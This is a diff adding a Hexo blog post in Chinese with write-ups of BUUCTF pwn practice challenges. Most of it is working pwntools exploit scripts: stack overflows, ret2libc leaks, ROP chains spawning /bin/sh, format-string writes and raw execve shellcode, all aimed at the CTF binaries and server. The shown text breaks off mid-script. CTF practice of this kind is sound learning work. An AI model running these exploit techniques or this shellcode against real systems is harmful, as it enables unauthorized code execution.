@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>pwn | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="寒假刷的buuctf上的pwn题，再过几遍基础，以后想玩了还会刷，持续更新。因为题太多自己又不是赛棍只能捡着刷，师傅们有想讨论的或求更新的可以发邮件，我尽力而为~~~ test_your_ncnc 连上 cat flag 即可 warmup_csaw_2016from pwn import * context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn">
+<meta property="og:url" content="http://example.com/2020/07/31/2020-07-31-buuctf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="寒假刷的buuctf上的pwn题，再过几遍基础，以后想玩了还会刷，持续更新。因为题太多自己又不是赛棍只能捡着刷，师傅们有想讨论的或求更新的可以发邮件，我尽力而为~~~ test_your_ncnc 连上 cat flag 即可 warmup_csaw_2016from pwn import * context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-07-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2020-07-31-buuctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/07/31/2020-07-31-buuctf/" class="article-date">
+  <time class="dt-published" datetime="2020-07-30T16:00:00.000Z" itemprop="datePublished">2020-07-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      pwn
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>寒假刷的buuctf上的pwn题，再过几遍基础，以后想玩了还会刷，持续更新。因为题太多自己又不是赛棍只能捡着刷，师傅们有想讨论的或求更新的可以发邮件，我尽力而为~~~</p>
+<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>nc 连上 <code>cat flag</code> 即可</p>
+<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./warmup_csaw_2016&#39;)
+context.log_level = &#39;debug&#39;
+#p=remote(&#39;node3.buuoj.cn&#39;,29987)
+payload = &#39;a&#39;*72+p64(0x40060D)
+sleep(0.1)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./pwn1_sctf_2016&#39;)
+context.log_level = &#39;debug&#39;
+#p=remote(&#39;node3.buuoj.cn&#39;,29987)
+payload = &#39;IIIIIIIIIIIIIIIIIIII1234&#39;+p64(0x8048F13)
+sleep(0.1)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>自己逆向太菜了,试出来的~~~</p>
+<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./ciscn_2019_n_1&#39;)
+context.log_level = &#39;debug&#39;
+payload = &#39;a&#39;*56+p64(0x4006BE)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>也可以覆盖 v2 值</p>
+<pre><code>from pwn import *
+p = process(&#39;./ciscn_2019_n_1&#39;)
+payload=&#39;a&#39;*0x2c+p64(0x41348000)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./pwn_patched&#39;)
+libc=ELF(&#39;./libc-2.23.so&#39;)
+elf = ELF(&#39;./pwn_patched&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,26443)
+payload = &#39;\x00&#39;+&#39;\xff&#39;*(0x20-2)
+p.sendline(payload)
+p.recvuntil(&#39;Correct\n&#39;)
+got = elf.got[&quot;puts&quot;]
+plt = elf.plt[&#39;puts&#39;]
+payload = p32(plt)+p32(0x8048916)+p32(got)+p32(0x080487F6)+p32(235+12)
+p.sendline(&#39;a&#39;*(235-4)+p32(0x804a050+0xe7)+payload)
+real = u32(p.recvuntil(&#39;\x0a&#39;)[:-1])
+libc_base = real - libc.symbols[&quot;puts&quot;]
+one = 0x3a819 + libc_base
+print hex(one)
+p.send(&#39;a&#39;*235+p32(one)+p32(0))
+p.interactive()
+</code></pre>
+<p>就是一个常规的栈迁移.想法有点麻烦,中间穿插用了几个很菜的技巧,但 exp 还可以</p>
+<p>这里记录一下,首先 <code>\x123</code> 例如这种,系统只会保留后两个达到一个字节</p>
+<h2 id="ciscn-2019-c-1-ciscn-2019-en-2"><a href="#ciscn-2019-c-1-ciscn-2019-en-2" class="headerlink" title="ciscn_2019_c_1 &amp; ciscn_2019_en_2"></a>ciscn_2019_c_1 &amp; ciscn_2019_en_2</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./real&#39;)
+elf = ELF(&#39;./real&#39;)
+libc=elf.libc
+context.log_level = &#39;debug&#39;
+#p=remote(&#39;node3.buuoj.cn&#39;,26681)
+def cropy(payload):
+	te=&#39;&#39;
+	for a in (payload):
+		i=ord(a)
+		if  i &lt;= 0x60 or i &gt; 0x7A :
+			if  i &lt;= 0x40 or i &gt; 0x5A :
+				if  i &gt; 0x2F and i &lt;= 0x39 :
+					i =i^ 0xF
+			else:
+				i = i^0xE
+		else:
+			i = i^0xD
+		print i
+		te=te+chr(i)
+	print te
+	return te
+
+p.recvuntil(&#39;choice&#39;)
+p.sendline(&#39;1&#39;)
+p.recvuntil(&#39;encrypted&#39;)
+got = elf.got[&quot;puts&quot;]
+plt = elf.plt[&#39;puts&#39;]
+payload = &#39;a&#39;*88+p64(0x400C83)+p64(got)+p64(plt)+p64(0x400B28)
+co = cropy(payload)
+p.sendline(co)
+puts_got = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+base = puts_got - libc.symbols[&#39;puts&#39;]
+one = base+0x4f322
+payload = &#39;a&#39;*88+p64(one)
+p.recvuntil(&#39;choice&#39;)
+p.sendline(&#39;1&#39;)
+p.recvuntil(&#39;encrypted&#39;)
+co = cropy(payload)
+p.sendline(co)
+p.interactive()
+</code></pre>
+<p>python 异或一下,存在栈溢出泄露基址,然后返回 main 再来一遍,之后 one_gadget 直接出.我是傻逼,解这题 2&#x2F;3 时间都在看自己的异或函数哪有问题,最后发现自己想多了.啊啊啊啊啊啊,真得 C 语言怎么写 python 就怎么写</p>
+<p>##get_started_3dsctf_2016</p>
+<pre><code>from pwn import *
+from struct import pack
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level = &#39;debug&#39;
+#io = process(&quot;./get_started_3dsctf_2016&quot;)
+io = remote(&#39;node3.buuoj.cn&#39;,29153)
+p = &#39;&#39;
+p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; pop ecx ; pop ebx ; ret  
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0x080b91e6) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x080557ab) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0x080b91e6) # pop eax ; ret
+p += &#39;//sh&#39;
+p += pack(&#39;&lt;I&#39;, 0x080557ab) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0x08049463) # xor eax, eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x080557ab) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x080481ad) # pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x0806fc31) # pop ecx ; pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # padding without overwrite ebx
+p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0x080b91e6) # pop eax; ret
+p += pack(&#39;&lt;I&#39;, 11) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806d7e5) # int 0x80
+sleep(0.1)
+#gdb.attach(io,&#39;b*0x08048A3B&#39;)
+io.sendline(&#39;a&#39;*56+p)
+io.interactive()
+</code></pre>
+<p>静态编译的直接找 rop 就行,但是这里有 \x0a 截断,在 p 字符串输入的时候注意一下.还有一种直接用 mprotect ,也行</p>
+<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><pre><code>from pwn import *
+#p = process(&#39;./pwn&#39;)
+context.log_level = &#39;debug&#39;
+#p=remote(&#39;node3.buuoj.cn&#39;,27693)
+payload = fmtstr_payload(10, &#123;0x0804C044:123&#125;)
+p.send(payload)
+sleep(0.1)
+p.sendline(&#39;123&#39;)
+p.interactive()
+</code></pre>
+<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level = &#39;debug&#39;
+#io = process(&quot;./r2t3&quot;)
+io = remote(&#39;node3.buuoj.cn&#39;,29959)
+elf = ELF(&quot;r2t3&quot;)
+#libc=elf.libc
+libc=ELF(&quot;libc-2.29.so&quot;)
+got = elf.got[&quot;puts&quot;]
+plt = elf.plt[&#39;puts&#39;]
+io.recvuntil(&#39;name&#39;)
+#gdb.attach(io,&#39;b*0x08048A3B&#39;)
+payload = &#39;a&#39;*21+p32(plt)+p32(0x8048490)+p32(got)
+payload = payload.ljust(260,&#39;a&#39;)
+
+io.send(payload)
+real = u32(io.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;puts&quot;]
+print hex(libc_base)
+system = libc.symbols[&quot;system&quot;] + libc_base
+sh = libc_base+libc.search(&quot;/bin/sh&quot;).next()
+payload = &#39;a&#39;*21+p32(system)+p32(0xdeadbeef)+p32(sh)
+payload = payload.ljust(516,&#39;a&#39;)
+#gdb.attach(io,&#39;b*0x80485DE&#39;)
+io.send(payload)
+io.interactive()
+</code></pre>
+<p>什么??有后门??有意思吗</p>
+<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+def debug(addr,PIE=True):
+	if PIE:
+		text_base = int(os.popen(&quot;pmap &#123;&#125;| awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid)).readlines()[1], 16)
+		gdb.attach(p,&#39;b *&#123;&#125;&#39;.format(hex(text_base+addr)))
+	else:
+		gdb.attach(p,&quot;b *&#123;&#125;&quot;.format(hex(addr)))
+context.log_level = &#39;debug&#39;
+#p = process(&quot;./ciscn_2019_n_8&quot;)
+p = remote(&#39;node3.buuoj.cn&#39;,26250)
+elf = ELF(&quot;ciscn_2019_n_8&quot;)
+libc=elf.libc
+p.recvuntil(&#39;name?&#39;)
+#debug(0x000012DC)
+p.sendline(&#39;a&#39;*13*4+&#39;\x11&#39;)
+p.interactive()
+</code></pre>
+<p>我是傻逼,这题逻辑看错了,以为怎么这么难…这种题属实没意思</p>
+<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><pre><code>from pwn import *
+from struct import pack
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+io = remote(&#39;node3.buuoj.cn&#39;,29951)
+#io=process(&#39;./not_the_same_3dsctf_2016&#39;)
+# Padding goes here
+p = &#39;&#39;
+
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
+p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
+p += &#39;//sh&#39;
+p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0) # @ .data 
+p += pack(&#39;&lt;I&#39;, 0x0806fcf1) # pop ecx ; pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0)
+p += pack(&#39;&lt;I&#39;, 0x080eb060)
+p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
+p += pack(&#39;&lt;I&#39;, 0xb)
+p += pack(&#39;&lt;I&#39;, 0x0806d8a5) # int 0x80
+#gdb.attach(io,&#39;b*0x80489FB&#39;)
+io.sendline(&#39;1&#39;*(0x2d)+p)
+io.interactive()
+</code></pre>
+<p>加上之前欠的 mprotect 吧</p>
+<pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+io = remote(&#39;node3.buuoj.cn&#39;,28199)
+#io=process(&#39;./not_the_same_3dsctf_2016&#39;)
+# Padding goes here
+elf = ELF(&#39;not_the_same_3dsctf_2016&#39;)
+p3_ret = 0x0806fcf0
+#0x0806fcf0 : pop edx ; pop ecx ; pop ebx ; ret
+payload = p32(0x0806ED40)+p32(p3_ret)+p32(0x080EC000)+p32(1000)+p32(7)+p32(0x0806E200)+p32(0x080EC000)+p32(0)+p32(0x080EC000)+p32(50)
+io.sendline(&#39;1&#39;*(0x2d)+payload)
+io.send(&#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;)
+io.interactive()
+</code></pre>
+<p>另外本题还有个后门函数,那个 wp 就不写了</p>
+<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./patched&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,25577)
+elf = ELF(&#39;./patched&#39;)
+#libc = elf.libc
+payload =&#39;a&#39;*24 +p64(0x400683)+p64(0x601048)+p64(0x4005E3)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>拿 shell 后, flag 呢(美人鱼邓超状 : 头呢)??</p>
+<h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p=remote(&#39;node3.buuoj.cn&#39;,28535)
+payload =&#39;a&#39;*136 +p64(0x400596)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./one_gadget&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,28330)
+elf = ELF(&#39;./one_gadget&#39;)
+#libc = elf.libc
+libc=ELF(&#39;libc-2.29.so&#39;)
+context.log_level = &#39;debug&#39;
+p.recvuntil(&#39;u:0x&#39;)
+printf = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
+print printf
+libc_base = printf - libc.symbols[&#39;printf&#39;]
+print hex(libc_base)
+one = libc_base+0x106ef8
+print one
+p.sendline(str(one))
+p.interactive()
+</code></pre>
+<p>没啥说的, one_gadget 解决</p>
+<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p=remote(&#39;node3.buuoj.cn&#39;,29291)
+payload =&#39;a&#39;*140 +p32(0x804845C)+p32(0x0804A024)
+#payload =&#39;a&#39;*140 +p32(0x8048320)+p32(0)+p32(0x0804A024)
+#.plt:08048320 _system         proc near
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>在这里记录一下一个我之前一直没注意的知识点,事实上在这里两个 payload 都能用,在 plt 中才是真正满足中间夹杂返回地址的情况,如果把 ret 变成函数中的地址直接往栈里写就对了</p>
+<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./babyrop2&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,25183)
+elf = ELF(&#39;./babyrop2&#39;)
+#libc = elf.libc
+libc = ELF(&#39;libc.so.6&#39;)
+got = elf.got[&quot;read&quot;]
+plt = elf.plt[&#39;printf&#39;]
+format_s = 0x0400770
+payload =&#39;a&#39;*40 +p64(0x400733)+p64(format_s)+p64(0x400731)+p64(got)+p64(0)+p64(plt)+p64(0x400636)
+#0x0000000000400731 : pop rsi ; pop r15 ; ret
+p.recvuntil(&#39;name?&#39;)
+
+p.sendline(payload)
+printf = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+libc_base = printf - libc.symbols[&#39;read&#39;]
+print hex(libc_base)
+system = libc.symbols[&quot;system&quot;] + libc_base
+sh = libc_base+libc.search(&quot;/bin/sh&quot;).next()
+one = libc_base+0x4526a
+payload =&#39;a&#39;*40 +p64(one)+p64(0)*8
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>在这有个问题, 我想把 printf 地址用自己 printf 出来失败了,但是 read 是好使的???</p>
+<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./ciscn_s_3&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,26843)
+elf = ELF(&#39;./ciscn_s_3&#39;)
+libc = elf.libc
+#libc = ELF(&#39;libc.so.6&#39;)
+payload = &#39;a&#39;*16+p64(0x40059B)+p64(0)*5+p64(0x40059B)+p64(0)*5+p64(0x40059B)+p64(0)*5+p64(0x400503)+p64(0x4004F1)
+&#39;&#39;&#39;
+.text:00000000004004EB                 pop     rbp
+.text:00000000004004EC                 retn
+&#39;&#39;&#39;
+#gdb.attach(p,&#39;b*0x40059B&#39;)
+p.sendline(payload)
+off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+base = off-0x401733
+one = base+0x4f322
+payload = &#39;a&#39;*16+p64(one)+p64(0)*10
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>这种基本不限制输入的 one_gadget 通杀</p>
+<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./ciscn_2019_ne_5&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,28485)
+context.log_level = &#39;debug&#39;
+elf = ELF(&#39;./ciscn_2019_ne_5&#39;)
+#libc = elf.libc
+libc = ELF(&#39;./libc-2.27.so&#39;)
+got = elf.got[&quot;printf&quot;]
+print hex(got)
+plt = elf.plt[&#39;puts&#39;]
+print hex(plt)
+payload =&#39;2&#39;*76 +p32(plt)+p32(0x8048722)+p32(got)
+p.sendlineafter(&#39;password&#39;,&#39;administrator&#39;)
+p.sendlineafter(&#39;:&#39;,&#39;1&#39;)
+p.sendlineafter(&#39;info:&#39;,payload)
+p.sendlineafter(&#39;:&#39;,&#39;4&#39;)
+real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;printf&quot;]
+print hex(libc_base)
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+print hex(sh)
+payload = &#39;2&#39;*76 +p32(0x080486B9)+p32(sh)
+p.sendline(&#39;administrator&#39;)
+p.sendlineafter(&#39;:&#39;,&#39;1&#39;)
+p.sendlineafter(&#39;info:&#39;,payload)
+print hex(libc_base)
+print hex(sh)
+p.sendlineafter(&#39;:&#39;,&#39;4&#39;)
+p.interactive()
+</code></pre>
+<p>太尴尬了,我把 64 位 so 下载下来测偏移测了半天…然后在无聊在网上看 wp 找优化的时候第一次知道这种骚操作,根据函数名有 sh 来 getshell ,太秒了</p>
+<pre><code>from pwn import *
+r=remote(&#39;node3.buuoj.cn&#39;,25488)
+e=ELF(&#39;ciscn_2019_ne_5&#39;)
+sys_plt=e.plt[&#39;system&#39;]
+sh_addr=0x80482ea
+r.recvuntil(&#39;Please input admin password:&#39;)
+r.sendline(&#39;administrator&#39;)
+r.recvuntil(&#39;0.Exit\n:&#39;)
+r.sendline(&#39;1&#39;)
+payload=&#39;a&#39;*0x4c+p32(sys_plt)+&#39;aaaa&#39;+p32(sh_addr)
+r.recvuntil(&#39;Please input new log info:&#39;)
+r.sendline(payload)
+r.recvuntil(&#39;0.Exit\n:&#39;)
+r.sendline(&#39;4&#39;)
+r.interactive()
+&#39;&#39;&#39;
+LOAD:080482E6 byte_80482E6    db 66h                  ; DATA XREF: LOAD:0804820C↑o
+LOAD:080482E7                 db  66h ; f
+LOAD:080482E8                 db  6Ch ; l
+LOAD:080482E9                 db  75h ; u
+LOAD:080482EA                 db  73h ; s
+LOAD:080482EB                 db  68h ; h
+LOAD:080482EC                 db    0
+&#39;&#39;&#39;
+</code></pre>
+<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><pre><code>from pwn import*
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./pwn2_sctf_2016&#39;)
+elf=ELF(&#39;./pwn2_sctf_2016&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,28578)
+#libc = elf.libc
+libc = ELF(&#39;libc-2.23.so&#39;)
+got=elf.got[&#39;atoi&#39;]
+plt=elf.plt[&#39;printf&#39;]
+p.sendlineafter(&#39;read?&#39;,&#39;-1&#39;)
+#gdb.attach(p,&#39;b*0x80485A2&#39;)
+#p.sendlineafter(&#39;data&#39;,&#39;a&#39;*48+p32(0x804852F)*3)
+p.sendlineafter(&#39;data&#39;,&#39;a&#39;*48+p32(plt)+p32(0x804852F)+p32(0x80486F8)+p32(got))
+real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;atoi&quot;]
+print hex(libc_base)
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+print hex(sh)
+sys = libc_base + libc.symbols[&quot;system&quot;]
+one = libc_base+0x3a80c
+p.sendlineafter(&#39;read?&#39;,&#39;-1&#39;)
+
+p.sendlineafter(&#39;data&#39;,&#39;a&#39;*48+p32(sys)+p32(sh)*2)
+p.interactive()
+</code></pre>
+<p>这题套路性太强了,一看<code>int __cdecl get_n(int a1, unsigned int a2)</code>就知道老江湖了</p>
+<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><pre><code>from pwn import*
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+elf=ELF(&#39;./ez_pz_hackover_2016&#39;)
+context.log_level = &#39;debug&#39;
+#p = process(&#39;./ez_pz_hackover_2016&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,29043)
+libc = elf.libc
+#libc = ELF(&#39;libc-2.23.so&#39;)
+p.recvuntil(&#39;0x&#39;)
+recv = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
+#gdb.attach(p,&#39;b*0x80485F8&#39;)
+shellcode = &quot;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;
+p.sendline(&#39;crashme\x00&#39;+&#39;a&#39;*14+p32(recv-0x1c)*2+shellcode)
+p.interactive()
+</code></pre>
+<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><pre><code>from pwn import*
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+elf=ELF(&#39;./spwn&#39;)
+context.log_level = &#39;debug&#39;
+#p = process(&#39;./spwn&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,26668)
+#libc = elf.libc
+libc=ELF(&#39;libc-2.23.so&#39;)
+got=elf.got[&#39;write&#39;]
+plt=elf.plt[&#39;write&#39;]
+payload = &#39;c&#39;*4+p32(plt)+p32(0x08048513)+p32(1)+p32(got)+p32(4)
+p.sendafter(&#39;Ctfer&#39;,payload)
+p.sendafter(&#39;say&#39;,&#39;a&#39;*24+p32(0x804A300)+p32(0x8048511))
+real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;write&quot;]
+print hex(libc_base)
